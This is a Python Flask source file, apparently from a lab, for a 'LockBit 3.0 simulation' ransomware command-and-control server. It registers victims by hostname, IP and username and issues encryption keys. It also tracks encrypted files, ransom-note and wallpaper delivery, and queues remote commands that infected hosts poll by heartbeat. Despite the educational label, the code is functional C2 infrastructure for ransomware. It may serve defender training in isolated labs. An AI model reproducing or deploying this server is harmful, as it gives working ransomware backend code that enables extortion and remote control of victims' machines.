#!/usr/bin/env python3
"""
LockBit 3.0 Simulation - C2 Server (FIXED)
Educational purposes only - Isolated lab environment
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import json
import datetime
import hashlib
import secrets
import os

app = Flask(__name__)
CORS(app)

DB_FILE = 'c2_database.db'

# Database initialization
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Victims table with proper IP tracking
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id TEXT PRIMARY KEY,
                  hostname TEXT,
                  ip_address TEXT,
                  os_info TEXT,
                  username TEXT,
                  infection_time TEXT,
                  last_seen TEXT,
                  status TEXT,
                  files_encrypted INTEGER DEFAULT 0,
                  ransom_note_delivered TEXT,
                  wallpaper_changed TEXT,
                  quarantined INTEGER DEFAULT 0)''')
    
    # Files encrypted table
    c.execute('''CREATE TABLE IF NOT EXISTS encrypted_files
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  victim_id TEXT,
                  file_path TEXT,
                  file_size INTEGER,
                  encryption_time TEXT,
                  FOREIGN KEY(victim_id) REFERENCES victims(id))''')
    
    # Commands table
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  victim_id TEXT,
                  command TEXT,
                  timestamp TEXT,
                  executed INTEGER DEFAULT 0,
                  result TEXT)''')
    
    # Logs table
    c.execute('''CREATE TABLE IF NOT EXISTS activity_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  victim_id TEXT,
                  activity_type TEXT,
                  description TEXT,
                  timestamp TEXT)''')
    
    # Response actions table
    c.execute('''CREATE TABLE IF NOT EXISTS response_actions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  action_type TEXT,
                  target_victim TEXT,
                  timestamp TEXT,
                  status TEXT,
                  details TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

# Victim registration endpoint
@app.route('/api/register', methods=['POST'])
def register_victim():
    data = request.json
    
    # Get real IP from request
    real_ip = request.remote_addr
    victim_ip = data.get('ip_address', real_ip)
    
    victim_id = hashlib.sha256(
        f"{data['hostname']}{victim_ip}".encode()
    ).hexdigest()[:16]
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    c.execute('''INSERT OR REPLACE INTO victims 
                 (id, hostname, ip_address, os_info, username, infection_time, last_seen, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (victim_id, data['hostname'], victim_ip, 
               data['os_info'], data['username'], timestamp, timestamp, 'infected'))
    
    c.execute('''INSERT INTO activity_logs 
                 (victim_id, activity_type, description, timestamp)
                 VALUES (?, ?, ?, ?)''',
              (victim_id, 'INFECTION', f'Initial infection from {victim_ip}', timestamp))
    
    conn.commit()
    conn.close()
    
    print(f"[+] New victim registered: {data['hostname']} ({victim_ip}) - ID: {victim_id}")
    
    return jsonify({
        'status': 'success',
        'victim_id': victim_id,
        'encryption_key': secrets.token_hex(32)
    })

# File encryption reporting
@app.route('/api/report_encryption', methods=['POST'])
def report_encryption():
    data = request.json
    victim_id = data['victim_id']
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    for file_info in data['files']:
        c.execute('''INSERT INTO encrypted_files 
                     (victim_id, file_path, file_size, encryption_time)
                     VALUES (?, ?, ?, ?)''',
                  (victim_id, file_info['path'], file_info['size'], timestamp))
    
    c.execute('''UPDATE victims 
                 SET files_encrypted = files_encrypted + ?,
                     status = 'encrypting',
                     last_seen = ?
                 WHERE id = ?''',
              (len(data['files']), timestamp, victim_id))
    
    c.execute('''INSERT INTO activity_logs 
                 (victim_id, activity_type, description, timestamp)
                 VALUES (?, ?, ?, ?)''',
              (victim_id, 'ENCRYPTION', 
               f"Encrypted {len(data['files'])} files", timestamp))
    
    conn.commit()
    conn.close()
    
    print(f"[*] {victim_id}: Encrypted {len(data['files'])} files")
    
    return jsonify({'status': 'acknowledged'})

# Ransom note delivery confirmation
@app.route('/api/ransom_delivered', methods=['POST'])
def ransom_delivered():
    data = request.json
    victim_id = data['victim_id']
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    c.execute('''UPDATE victims 
                 SET ransom_note_delivered = ?,
                     status = 'ransom_deployed',
                     last_seen = ?
                 WHERE id = ?''',
              (timestamp, timestamp, victim_id))
    
    c.execute('''INSERT INTO activity_logs 
                 (victim_id, activity_type, description, timestamp)
                 VALUES (?, ?, ?, ?)''',
              (victim_id, 'RANSOM_NOTE', 
               'Ransom note delivered to victim', timestamp))
    
    conn.commit()
    conn.close()
    
    print(f"[*] {victim_id}: Ransom note deployed")
    
    return jsonify({'status': 'confirmed'})

# Wallpaper change confirmation
@app.route('/api/wallpaper_changed', methods=['POST'])
def wallpaper_changed():
    data = request.json
    victim_id = data['victim_id']
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    c.execute('''UPDATE victims 
                 SET wallpaper_changed = ?,
                     last_seen = ?
                 WHERE id = ?''',
              (timestamp, timestamp, victim_id))
    
    c.execute('''INSERT INTO activity_logs 
                 (victim_id, activity_type, description, timestamp)
                 VALUES (?, ?, ?, ?)''',
              (victim_id, 'WALLPAPER', 
               'Desktop wallpaper changed to ransom message', timestamp))
    
    conn.commit()
    conn.close()
    
    print(f"[*] {victim_id}: Wallpaper changed")
    
    return jsonify({'status': 'confirmed'})

# Get victim status
@app.route('/api/victims', methods=['GET'])
def get_victims():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('SELECT * FROM victims')
    victims = []
    for row in c.fetchall():
        victims.append({
            'id': row[0],
            'hostname': row[1],
            'ip_address': row[2],
            'os_info': row[3],
            'username': row[4],
            'infection_time': row[5],
            'last_seen': row[6],
            'status': row[7],
            'files_encrypted': row[8],
            'ransom_note_delivered': row[9],
            'wallpaper_changed': row[10],
            'quarantined': row[11]
        })
    
    conn.close()
    return jsonify(victims)

# Get activity logs
@app.route('/api/logs', methods=['GET'])
def get_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('SELECT * FROM activity_logs ORDER BY timestamp DESC LIMIT 100')
    logs = []
    for row in c.fetchall():
        logs.append({
            'id': row[0],
            'victim_id': row[1],
            'activity_type': row[2],
            'description': row[3],
            'timestamp': row[4]
        })
    
    conn.close()
    return jsonify(logs)

# Heartbeat endpoint with command polling
@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    victim_id = data['victim_id']
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    # Update last seen
    c.execute('''UPDATE victims 
                 SET last_seen = ?
                 WHERE id = ?''',
              (timestamp, victim_id))
    
    # Check for pending commands
    c.execute('''SELECT id, command FROM commands 
                 WHERE victim_id = ? AND executed = 0''',
              (victim_id,))
    
    pending_commands = []
    for cmd_row in c.fetchall():
        pending_commands.append({
            'id': cmd_row[0],
            'command': cmd_row[1]
        })
    
    conn.commit()
    conn.close()
    
    return jsonify({
        'status': 'alive', 
        'commands': pending_commands
    })

# Command execution result
@app.route('/api/command_result', methods=['POST'])
def command_result():
    data = request.json
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    c.execute('''UPDATE commands 
                 SET executed = 1, result = ?
                 WHERE id = ?''',
              (data['result'], data['command_id']))
    
    c.execute('''INSERT INTO activity_logs 
                 (victim_id, activity_type, description, timestamp)
                 VALUES (?, ?, ?, ?)''',
              (data['victim_id'], 'COMMAND_EXEC', 
               f"Command executed: {data['result']}", timestamp))
    
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'acknowledged'})

# Quarantine action
@app.route('/api/action/quarantine', methods=['POST'])
def action_quarantine():
    data = request.json
    target = data.get('target', 'all')
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    if target == 'all':
        # Send quarantine command to all active victims
        c.execute('''SELECT id FROM victims WHERE quarantined = 0''')
        victim_ids = [row[0] for row in c.fetchall()]
        
        for vid in victim_ids:
            c.execute('''INSERT INTO commands 
                         (victim_id, command, timestamp)
                         VALUES (?, ?, ?)''',
                      (vid, 'QUARANTINE', timestamp))
            
            c.execute('''UPDATE victims SET quarantined = 1 WHERE id = ?''', (vid,))
        
        c.execute('''INSERT INTO response_actions 
                     (action_type, target_victim, timestamp, status, details)
                     VALUES (?, ?, ?, ?, ?)''',
                  ('QUARANTINE', 'all', timestamp, 'success', 
                   f'Quarantined {len(victim_ids)} systems'))
        
        conn.commit()
        conn.close()
        
        print(f"[!] QUARANTINE: {len(victim_ids)} systems isolated")
        
        return jsonify({
            'status': 'success',
            'affected': len(victim_ids),
            'message': f'Quarantined {len(victim_ids)} systems'
        })
    else:
        # Quarantine specific victim
        c.execute('''INSERT INTO commands 
                     (victim_id, command, timestamp)
                     VALUES (?, ?, ?)''',
                  (target, 'QUARANTINE', timestamp))
        
        c.execute('''UPDATE victims SET quarantined = 1 WHERE id = ?''', (target,))
        
        c.execute('''INSERT INTO response_actions 
                     (action_type, target_victim, timestamp, status, details)
                     VALUES (?, ?, ?, ?, ?)''',
                  ('QUARANTINE', target, timestamp, 'success', 
                   f'Quarantined system {target}'))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'affected': 1})

# Decrypt action
@app.route('/api/action/decrypt', methods=['POST'])
def action_decrypt():
    data = request.json
    target = data.get('target', 'all')
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    timestamp = datetime.datetime.now().isoformat()
    
    if target == 'all':
        c.execute('''SELECT id FROM victims''')
        victim_ids = [row[0] for row in c.fetchall()]
        
        for vid in victim_ids:
            c.execute('''INSERT INTO commands 
                         (victim_id, command, timestamp)
                         VALUES (?, ?, ?)''',
                      (vid, 'DECRYPT', timestamp))
        
        c.execute('''INSERT INTO response_actions 
                     (action_type, target_victim, timestamp, status, details)
                     VALUES (?, ?, ?, ?, ?)''',
                  ('DECRYPT', 'all', timestamp, 'success', 
                   f'Decryption initiated for {len(victim_ids)} systems'))
        
        conn.commit()
        conn.close()
        
        print(f"[!] DECRYPT: Initiated for {len(victim_ids)} systems")
        
        return jsonify({
            'status': 'success',
            'affected': len(victim_ids),
            'message': f'Decryption started for {len(victim_ids)} systems'
        })
    else:
        c.execute('''INSERT INTO commands 
                     (victim_id, command, timestamp)
                     VALUES (?, ?, ?)''',
                  (target, 'DECRYPT', timestamp))
        
        c.execute('''INSERT INTO response_actions 
                     (action_type, target_victim, timestamp, status, details)
                     VALUES (?, ?, ?, ?, ?)''',
                  ('DECRYPT', target, timestamp, 'success', 
                   f'Decryption initiated for {target}'))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'affected': 1})

# Get response actions log
@app.route('/api/response_actions', methods=['GET'])
def get_response_actions():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('''SELECT * FROM response_actions 
                 ORDER BY timestamp DESC LIMIT 50''')
    
    actions = []
    for row in c.fetchall():
        actions.append({
            'id': row[0],
            'action_type': row[1],
            'target_victim': row[2],
            'timestamp': row[3],
            'status': row[4],
            'details': row[5]
        })
    
    conn.close()
    return jsonify(actions)

if __name__ == '__main__':
    print("╔════════════════════════════════════════╗")
    print("║  LockBit 3.0 C2 Server - FIXED        ║")
    print("╚════════════════════════════════════════╝")
    print(f"[*] Database: {os.path.abspath(DB_FILE)}")
    print("[*] Starting on 0.0.0.0:5000")
    print("[*] Endpoints:")
    print("    - POST /api/register")
    print("    - POST /api/report_encryption")
    print("    - POST /api/ransom_delivered")
    print("    - POST /api/wallpaper_changed")
    print("    - POST /api/heartbeat")
    print("    - GET  /api/victims")
    print("    - GET  /api/logs")
    print("    - POST /api/action/quarantine")
    print("    - POST /api/action/decrypt")
    print()
    app.run(host='0.0.0.0', port=5000, debug=False)
